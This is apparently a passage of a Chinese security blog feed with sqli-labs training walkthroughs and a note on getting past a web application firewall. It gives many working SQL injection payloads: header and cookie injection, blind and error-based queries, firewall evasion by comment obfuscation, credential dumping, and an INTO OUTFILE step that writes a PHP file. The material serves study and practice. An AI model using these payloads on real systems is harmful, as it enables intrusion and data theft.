SLEEP(5) OR &#x27;</span><span class="number">1</span><span class="string">&#x27;=&#x27;</span><span class="number">1</span> </span><br></pre></td></tr></table></figure><p>成功延时，翻阅源代码后发现</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check_input</span>(<span class="params"><span class="variable">$value</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">empty</span>(<span class="variable">$value</span>))</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">// truncation (see comments)</span></span><br><span class="line"><span class="variable">$value</span> = substr(<span class="variable">$value</span>,<span class="number">0</span>,<span class="number">20</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Stripslashes if magic quotes enabled</span></span><br><span class="line"><span class="keyword">if</span> (get_magic_quotes_gpc())</span><br><span class="line">&#123;</span><br><span class="line"><span class="variable">$value</span> = stripslashes(<span class="variable">$value</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Quote if not a number</span></span><br><span class="line"><span class="keyword">if</span> (!ctype_digit(<span class="variable">$value</span>))</span><br><span class="line">&#123;</span><br><span class="line"><span class="variable">$value</span> = <span class="string">&quot;&#x27;&quot;</span> . mysql_real_escape_string(<span class="variable">$value</span>) . <span class="string">&quot;&#x27;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="variable">$value</span> = intval(<span class="variable">$value</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="variable">$value</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$uagent <span class="operator">=</span> $_SERVER[<span class="string">&#x27;HTTP_USER_AGENT&#x27;</span>];</span><br><span class="line">$IP <span class="operator">=</span> $_SERVER[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>];</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">$<span class="keyword">insert</span><span class="operator">=</span>&quot;INSERT INTO `security`.`uagents` (`uagent`, `ip_address`, `username`) VALUES (&#x27;$uagent&#x27;, &#x27;$IP&#x27;, $uname)&quot;;</span><br><span class="line">mysql_query($<span class="keyword">insert</span>);</span><br></pre></td></tr></table></figure><p>可见这里对于传入的uname和passwd值做了一个过滤，而对于uagent则没有防护，引起http头注入</p><hr><h2 id="Less-19"><a href="#Less-19" class="headerlink" title="Less-19"></a>Less-19</h2><p>根据Less-18的经验很快确定是Referer头的注入，且依旧未对内容进行实体化，造成xss</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Referer: http://192.168.98.133/sqli/Less-19/ <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript">alert(<span class="string">&quot;XSS&quot;</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p>根据Less-18的闭合思路</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Referer: http:<span class="operator">/</span><span class="operator">/</span><span class="number">192.168</span><span class="number">.98</span><span class="number">.133</span><span class="operator">/</span>sqli<span class="operator">/</span>Less<span class="number">-19</span><span class="operator">/</span> <span class="string">&#x27; or &#x27;</span><span class="number">1</span><span class="string">&#x27;=&#x27;</span><span class="number">1</span></span><br></pre></td></tr></table></figure><p>闭合成功</p><p>构造注入语句</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Referer: http:<span class="operator">/</span><span class="operator">/</span><span class="number">192.168</span><span class="number">.98</span><span class="number">.133</span><span class="operator">/</span>sqli<span class="operator">/</span>Less<span class="number">-19</span><span class="operator">/</span> <span class="string">&#x27; OR UPADTAXML(1,CONCAT(0x7e,(SELECT DATABASE()),0x7e),1) or &#x27;</span><span class="number">1</span><span class="string">&#x27;=&#x27;</span><span class="number">1</span></span><br></pre></td></tr></table></figure><p>成功爆出<code>FUNCTION security.UPADTAXML does not exist</code><br>成功</p><hr><h2 id="Less-20"><a href="#Less-20" class="headerlink" title="Less-20"></a>Less-20</h2><p>关卡提示是Cookies注入，首先测试一下，发现会跳转<br>慢慢放包发现</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/sqli/Less-20/index.php</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>192.168.98.133</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:80.0) Gecko/20100101 Firefox/80.0</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>http://192.168.98.133/sqli/Less-20/index.php</span><br><span class="line"><span class="attribute">DNT</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>uname=admin</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br></pre></td></tr></table></figure><p>放过后页面提示</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">YOUR USER AGENT IS : Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:80.0) Gecko/20100101 Firefox/80.0</span><br><span class="line">YOUR IP ADDRESS IS : 192.168.98.1</span><br><span class="line">DELETE YOUR COOKIE OR WAIT FOR IT TO EXPIRE</span><br><span class="line">YOUR COOKIE : uname = admin and expires: Sun 30 Aug 2020 - 15:23:53</span><br><span class="line">Your Login name:admin</span><br><span class="line">Your Password:11111</span><br><span class="line">Your ID:8</span><br></pre></td></tr></table></figure><p>又是一堆没有过滤，也能插xss</p><p>我们把注意力放在cookies上<br>构造注入语句</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Cookie: uname<span class="operator">=</span>admin <span class="string">&#x27; or extractvalue(1,concat(user(),0x7e,database())) or &#x27;</span><span class="number">1</span><span class="string">&#x27;=&#x27;</span><span class="number">1</span></span><br></pre></td></tr></table></figure><p>返回<code>Issue with your mysql: XPATH syntax error: &#39;@localhost~security&#39;</code><br>成功</p><p>接下来试试前一个登录页面是否存在注入，发现突破不了<br>一打开源码，果然，又有过滤。。。。。</p><hr><h2 id="Less-21"><a href="#Less-21" class="headerlink" title="Less-21"></a>Less-21</h2><p>这次果断不测试前面，肯定有过滤直接走后面流程<br>页面中又是熟悉的xss的香味，可惜是x自己<br>看到请求包可以很明显的看到不同</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Cookie: uname=YWRtaW4%3D</span><br></pre></td></tr></table></figure><p>通过base64解码可知内容<code>admin</code></p><p>嗯开始构造注入语句</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27; OR UPDATEXML(1,CONCAT(0x7e,(SELECT DATABASE()),0x7e),1) OR &#x27;</span><span class="number">1</span><span class="string">&#x27;=&#x27;</span><span class="number">1</span></span><br></pre></td></tr></table></figure><p>加密后<br><code>JyBPUiBVUERBVEVYTUwoMSxDT05DQVQoMHg3ZSwoU0VMRUNUIERBVEFCQVNFKCkpLDB4N2UpLDEpIE9SICcxJz0nMQ==</code><br>爆出错误<br><code>Issue with your mysql: XPATH syntax error: &#39;~security~&#39;</code><br>成功</p><p>这里再对user agent进行注入，发现失败</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">echo</span> <span class="string">&quot;YOUR USER AGENT IS : &quot;</span>.<span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_USER_AGENT&#x27;</span>];</span><br></pre></td></tr></table></figure><p>这里作者并未进行sql操作，只是直接打印</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$cookee</span> = base64_decode(<span class="variable">$cookee</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;SELECT * FROM users WHERE username=(&#x27;<span class="subst">$cookee</span>&#x27;) LIMIT 0,1&quot;</span>;</span><br><span class="line"><span class="variable">$result</span>=mysql_query(<span class="variable">$sql</span>);</span><br></pre></td></tr></table></figure><p>而对于cookee则是进行了查询，且这里的cookee只是简单进行了base64加密，而并未进行过滤操作</p><hr><h2 id="Less-22"><a href="#Less-22" class="headerlink" title="Less-22"></a>Less-22</h2><p>这里依旧是一个cookies的注入<br>首先根据Less-21的payload直接插</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Cookie: uname=YWRtaW4%3DJyBPUiBVUERBVEVYTUwoMSxDT05DQVQoMHg3ZSwoU0VMRUNUIERBVEFCQVNFKCkpLDB4N2UpLDEpIE9SICcxJz0nMQ==</span><br></pre></td></tr></table></figure><p>失败<br>换个闭合方式</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&quot; OR UPDATEXML(1,CONCAT(0x7e,(SELECT DATABASE()),0x7e),1) OR &quot;<span class="number">1</span>&quot;=&quot;<span class="number">1</span></span><br><span class="line"></span><br><span class="line">IiBPUiBVUERBVEVYTUwoMSxDT05DQVQoMHg3ZSwoU0VMRUNUIERBVEFCQVNFKCkpLDB4N2UpLDEpIE9SICIxIj0iMQ<span class="operator">=</span><span class="operator">=</span></span><br></pre></td></tr></table></figure><p>爆出<br><code>Issue with your mysql: XPATH syntax error: &#39;~security~&#39;</code><br>嘻嘻，成功</p><hr>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;Sqli-lab-过关笔记-Less-11-Less-22&quot;&gt;&lt;a href=&quot;#Sqli-lab-过关笔记-Less-11-Less-22&quot; class=&quot;headerlink&quot; title=&quot;Sqli-lab 过关笔记 Less 11-Less 22&quot;&gt;&lt;/a&gt;Sqli-lab 过关笔记 Less 11-Less 22&lt;/h1&gt;</summary>
    
    
    
    <category term="学习笔记" scheme="http://0w0.host/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
    
    <category term="笔记" scheme="http://0w0.host/tags/%E7%AC%94%E8%AE%B0/"/>
    
    <category term="渗透" scheme="http://0w0.host/tags/%E6%B8%97%E9%80%8F/"/>
    
    <category term="sqli-lab" scheme="http://0w0.host/tags/sqli-lab/"/>
    
  </entry>
  
  <entry>
    <title>过安全狗笔记</title>
    <link href="http://0w0.host/2020/08/11/%E8%BF%87%E5%AE%89%E5%85%A8%E7%8B%97%E7%AC%94%E8%AE%B0/"/>
    <id>http://0w0.host/2020/08/11/%E8%BF%87%E5%AE%89%E5%85%A8%E7%8B%97%E7%AC%94%E8%AE%B0/</id>
    <published>2020-08-10T17:56:54.000Z</published>
    <updated>2020-08-12T04:54:47.458Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>0x00 起因</p></blockquote><p>今天顾总给我们演示了如何过狗注入，嘻嘻嘻，当然要自己来一遍,当作交作业,嘻嘻嘻</p><a id="more"></a><blockquote><p>0x01 开始</p></blockquote><p>测试点: sqli-lab Less-2</p><p><code>http://192.168.133.132/sqli/Less-2/?id=1</code></p><p><img src="https://i.loli.net/2020/08/11/KJdw1ZkQmYno7HL.png" alt="1.png"></p><p>既然看了顾总的演示,第一步的order by当然要改成group by,成功探测只有三个</p><p>之后便是绕掉<code>SELECT</code>关键字,这里顾总说的是用<code>/*! */</code>注释绕掉成功,这里给44344点赞</p><p><code>http://192.168.133.132/sqli/Less-2/?id=1 union /*!44344select*/ 1,2,3 limit 1,1 --+</code></p><p><img src="https://i.loli.net/2020/08/11/dwyAWuFgOzPY9pt.png" alt="2.png"></p><p><code>http://192.168.133.132/sqli/Less-2/?id=0 union /*!44344select*/ 1,/*!44190database()*/,/*!44190user()*/</code></p><p>之后发现database()怎么都绕不过,我不知道我是不是演示的时候画面卡没注意这个细节,所以分别试了绕database和(),然后用<code>/*!44190database/*!()*/*/</code></p><p><code>http://192.168.133.132/sqli/Less-2/?id=0 union /*!44344select*/ 1,/*!44190database/*!()*/*/,/*!44190user/*!()*/*/</code></p><p>又爆语法错误,看了半天错误信息发现多了<code>*/</code>然后直接删掉括号后一个后成功</p><p><code>http://192.168.133.132/sqli/Less-2/?id=0 union /*!44344select*/ 1,/*!44190database/*!()*/,/*!44190user/*!()*/</code></p><p><img src="https://i.loli.net/2020/08/11/K7MWNeQ1F4cTvsy.png" alt="3.png"></p><p><code>http://192.168.133.132/sqli/Less-2/?id=1 union /*!20444select*/ 1,group_concat(table_name),3 /*!25244from*/ information_schema.tables where table_schema=/*!44190database/*!()*/ limit 1,1 -- jsij</code></p><p>爆表名成功</p><p><img src="https://i.loli.net/2020/08/11/SDd8AnEi2pTfkCr.png" alt="4.png"></p><p><code>http://192.168.133.132/sqli/Less-2/?id=1 union /*!20444select*/ 1,group_concat(column_name),3 /*!25244from*/ information_schema.columns where table_name= &#39;users &#39; limit 1,1 -- jsij</code></p><p><img src="https://i.loli.net/2020/08/11/bWsE87KfT2GANSu.png" alt="5.png"></p><p>卧槽,明明没有错</p><p><img src="https://i.loli.net/2020/08/11/pOoEL9f4JPjyHkY.png" alt="6.png"></p><p>不过很明显输出多了两个<code>/</code>嗯,绕了绕过不去,再看了源码,不过没有转义的函数,不过还是应该是sql把单引号转义掉了,就把<code>users</code>Hex转义成<code>0x7573657273</code>之后测试成功</p><p><code>http://192.168.133.132/sqli/Less-2/?id=1 union /*!20444select*/ 1,group_concat(column_name),3 /*!25244from*/ information_schema.columns where table_name=0x7573657273 limit 1,1 -- jsij</code></p><p><img src="https://i.loli.net/2020/08/11/o3WipwlJPk659LT.png" alt="7.png"></p><p>再来查字段,成功</p><p><code>http://192.168.133.132/sqli/Less-2/?id=1 union /*!20444select*/ 1,group_concat(username,0x3a,password),3 /*!25244from*/ users limit 1,1 -- jsij</code></p><p><img src="https://i.loli.net/2020/08/11/ihqX5F6JVBYsvbm.png" alt="8.png"></p><blockquote><p>0x02 后记</p></blockquote><p>虽然只是复现了顾总的操作,不过依旧很多坑,非常难受</p><p><img src="https://i.loli.net/2020/08/11/x126Eko5g34Dcrl.png" alt="9.png"></p><p>还是这么多条记录,不过幸不辱命还是完成了</p><p>不过这里转义单引号这个事,原因是当php.ini里的magic_quotes_gpc=On时。提交的变量中所有的单引号（’）、双引号（”）、反斜线（\）与 NUL（NULL 字符）会自动转为含有反斜线的转义字符。PHP 5.4 之前 PHP 指令 magic_quotes_gpc 默认是 on.</p>]]></content>
    
    
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;0x00 起因&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;今天顾总给我们演示了如何过狗注入，嘻嘻嘻，当然要自己来一遍,当作交作业,嘻嘻嘻&lt;/p&gt;</summary>
    
    
    
    
    <category term="笔记" scheme="http://0w0.host/tags/%E7%AC%94%E8%AE%B0/"/>
    
    <category term="渗透测试" scheme="http://0w0.host/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
  </entry>
  
  <entry>
    <title>sqli-lab Less 1-Less 10</title>
    <link href="http://0w0.host/2020/08/09/sqli-lab-Less-1-Less-10/"/>
    <id>http://0w0.host/2020/08/09/sqli-lab-Less-1-Less-10/</id>
    <published>2020-08-09T15:56:10.000Z</published>
    <updated>2020-09-10T14:09:05.974Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Sqli-lab-过关笔记-Less-1-Less-10"><a href="#Sqli-lab-过关笔记-Less-1-Less-10" class="headerlink" title="Sqli-lab 过关笔记 Less 1-Less 10"></a>Sqli-lab 过关笔记 Less 1-Less 10</h1><a id="more"></a><h2 id="Less-1"><a href="#Less-1" class="headerlink" title="Less-1"></a>Less-1</h2><p>首先加单引号查看其报错信息</p><p><code>&#39;1&#39;&#39; LIMIT 0,1</code></p><p>根据报错的语句可以推测大概sql的查询语句是</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> USERS <span class="keyword">WHERE</span> ID <span class="operator">=</span> <span class="string">&#x27;id&#x27;</span> LIMIT <span class="number">0</span>,<span class="number">1</span></span><br></pre></td></tr></table></figure><p>可见是单引号闭合的查询语句，由此就可以构造注入的语句</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">0</span><span class="string">&#x27; UNION SELECT 1,database(),3 --+</span></span><br></pre></td></tr></table></figure><p>便可以进行下一步注入</p><hr><h2 id="Less-2"><a href="#Less-2" class="headerlink" title="Less-2"></a>Less-2</h2><p>加单引号显示报错 </p><p> <code>You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#39;\&#39; LIMIT 0,1&#39; at line 1</code></p><p>而sql语句的报错信息是  <code>\&#39; LIMIT 0,1</code><br>人为用”&quot;告诉编译器换行<br>而一般的查询语句大致就是  </p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> USERS <span class="keyword">WHERE</span> ID <span class="operator">=</span> id</span><br><span class="line">LIMIT <span class="number">0</span>,<span class="number">1</span></span><br></pre></td></tr></table></figure><p>输入<code>&#39;</code>后出现语法错误报错使语句变成</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> <span class="keyword">USER</span> <span class="keyword">WHERE</span> ID <span class="operator">=</span> id</span><br><span class="line"><span class="string">&#x27;LIMIT 0,1 #单引号未被闭合</span></span><br></pre></td></tr></table></figure><p>所以后加入注释<code>#</code>或<code>--+</code>或<code>--%20</code>后</p><p>则返回正常，此时语句是</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> USERNAME,PASSWD <span class="keyword">FROM</span> USERS <span class="keyword">WHERE</span> ID <span class="operator">=</span> id</span><br><span class="line"># LIMIT <span class="number">0</span>,<span class="number">1</span></span><br></pre></td></tr></table></figure><p>而后面知道了出现<code>\</code>，这是php自动开了<code>&#39;</code> 的转义，具体怎么关闭可以看我的另一篇笔记</p><hr><h2 id="Less-3"><a href="#Less-3" class="headerlink" title="Less-3"></a>Less-3</h2><p>加单引号后报错信息是<br><code>&#39;1&#39;&#39;) LIMIT 0,1</code></p><p>去掉一个单引号后变成<br><code>&#39;1&#39;) LIMIT 0,1</code></p><p>可以推测是由小括号闭合的查询语句</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> USRES <span class="keyword">WHERE</span> ID <span class="operator">=</span> (<span class="string">&#x27;id&#x27;</span>) LIMIT <span class="number">0</span>,<span class="number">1</span></span><br></pre></td></tr></table></figure><p>闭合单引号加括号后连接注入语句，成功回显</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">0</span><span class="string">&#x27;) union select 1,database(),3 --+</span></span><br></pre></td></tr></table></figure><hr><h2 id="Less-4"><a href="#Less-4" class="headerlink" title="Less-4"></a>Less-4</h2><p>加单引号，括号皆返回正常<br>加双引号后爆出错误<br><code>&quot;1&quot;&quot;) LIMIT 0,1</code></p><p>去掉一个双引号<br><code>&quot;1&quot;) LIMIT 0,1</code></p><p>可以推测这是由双引号和括号闭合的查询语句</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> USERS <span class="keyword">WHERE</span> ID <span class="operator">=</span> (&quot;id&quot;) LIMIT <span class="number">0</span>,<span class="number">1</span></span><br></pre></td></tr></table></figure><p>闭合语句后插入注入语句,成功回显</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">0</span>&quot;) UNION SELECT 1,database(),3 --+</span><br></pre></td></tr></table></figure><hr><h2 id="Less-5"><a href="#Less-5" class="headerlink" title="Less-5"></a>Less-5</h2><p>开局就是<code>You are in ...</code><br>这是盲注关卡了，首先单引号探路<br><code>&#39;1&#39;&#39; LIMIT 0,1</code><br>去掉一个单引号后可以推知查询语句</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> USERS <span class="keyword">WHERE</span> ID <span class="operator">=</span> <span class="string">&#x27;id&#x27;</span> LIMIT <span class="number">0</span>,<span class="number">1</span></span><br></pre></td></tr></table></figure><p>之后闭合语句注入，回显正常结果为true</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; and length(database())=8 --+</span></span><br></pre></td></tr></table></figure><p>验证成功，扔Sqlmap</p><hr><h2 id="Less-6"><a href="#Less-6" class="headerlink" title="Less-6"></a>Less-6</h2><p>加上单引号小括号没反应，双引号报错</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;1&quot;&quot; LIMIT 0,1</span><br></pre></td></tr></table></figure><p>去掉一个双引号可推知查询语句</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> USERS <span class="keyword">WHERE</span> ID <span class="operator">=</span> &quot;id&quot; LIMIT <span class="number">0</span>,<span class="number">1</span></span><br></pre></td></tr></table></figure><p>闭合语句后插入注入语句</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span>&quot; AND LENGTH(DATABASE())=8 --+</span><br></pre></td></tr></table></figure><p>验证成功，扔sqlmap</p><hr><h2 id="Less-7"><a href="#Less-7" class="headerlink" title="Less-7"></a>Less-7</h2><p>单引号探路扔出错误<br><code>You have an error in your SQL syntax</code><br>扔出双引号单括号回显正常</p><p>用<code>&#39; --+</code>试图闭合爆出<br><code>You have an error in your SQL syntax</code></p><p>用<code>&#39;) --+</code>试图闭合爆出<br><code>You have an error in your SQL syntax</code></p><p>用<code>&#39;)) --+</code> 回显正常，闭合成功</p><p>由此可以推知查询语句</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> USERS <span class="keyword">WHERE</span> ID <span class="operator">=</span> ((<span class="string">&#x27;id&#x27;</span>)) LIMIT <span class="number">0</span>,<span class="number">1</span></span><br></pre></td></tr></table></figure><p>闭合引号验证</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27;)) AND LENGTH(DATABASE())=8 --+</span></span><br></pre></td></tr></table></figure><p>回显正常</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27;)) AND ASCII(SUBSTR(DATABASE(),1,1)))=116 --+</span></span><br></pre></td></tr></table></figure><p>这样猜解又错误</p><p>然后突然注意到一直被忽略的标题<br><code>Dump into outfile</code><br>原来这才是考察的内容</p><p>然后查了一下mysql outfile的相关内容<br>发现是一个导出查询内容文件的函数，于是去构造注入语句</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27;)) union select 1,&#x27;</span><span class="operator">&lt;</span>?php phpinfo();?<span class="operator">&gt;</span><span class="string">&#x27;,3 into outfile &#x27;</span>C:\\phpStudy2016\\WWW\\sqli\\Less<span class="number">-7</span>\\<span class="number">1.</span>php<span class="string">&#x27;--+</span></span><br></pre></td></tr></table></figure><p>这里写文件的话需要</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">root以及更高权限</span><br><span class="line">secure_file_priy不为<span class="keyword">NULL</span></span><br><span class="line"><span class="keyword">set</span> globle general_log <span class="operator">=</span> <span class="keyword">on</span></span><br></pre></td></tr></table></figure><p>后才可以正常写入</p><hr><h2 id="Less-8"><a href="#Less-8" class="headerlink" title="Less-8"></a>Less-8</h2><p>日常单引号开路无回显，双引号小括号均正常<br>闭合单引号后正常，即可推知查询语句</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> USERS <span class="keyword">WHERE</span> ID <span class="operator">=</span> <span class="string">&#x27;id&#x27;</span></span><br></pre></td></tr></table></figure><p>构造闭合语句注入</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; AND LENGTH(DATABASE()) &gt; 0 --+</span></span><br><span class="line"><span class="string">?id=1&#x27;</span> <span class="keyword">AND</span> SUBSTR(DATABASE(),<span class="number">1</span>,<span class="number">1</span>)<span class="operator">=</span><span class="string">&#x27;s&#x27;</span> <span class="comment">--+</span></span><br></pre></td></tr></table></figure><p>回显正常，验证成功，扔sqlmap</p><hr><h2 id="Less-9"><a href="#Less-9" class="headerlink" title="Less-9"></a>Less-9</h2><p>常规单引号探测，发现无论是单引号双引号还是小括号都回显正常</p><p>在单引号后接<code>AND 1=2 --+</code>，双引号小括号同上都返回正常<br>说明不是bool型盲注</p><p>用<code>AND SLEEP(5) --+</code>接在后探测<br>发现只有单引号触发SLEEP效果由此可推测查询语句是</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> USERS <span class="keyword">WHERE</span> ID <span class="operator">=</span> <span class="string">&#x27;id&#x27;</span></span><br></pre></td></tr></table></figure><p>由此可闭合构造语句验证</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; AND IF(LENGTH(DATABASE())&gt;0,SLEEP(3),1) --+</span></span><br></pre></td></tr></table></figure><p>延时成功验证，扔sqlmap</p><hr><h2 id="Less-10"><a href="#Less-10" class="headerlink" title="Less-10"></a>Less-10</h2><p>同样是对闭合方法进行测试<br>直接回显正常，bool方法回显正常<br>则构造sleep进行验证</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span 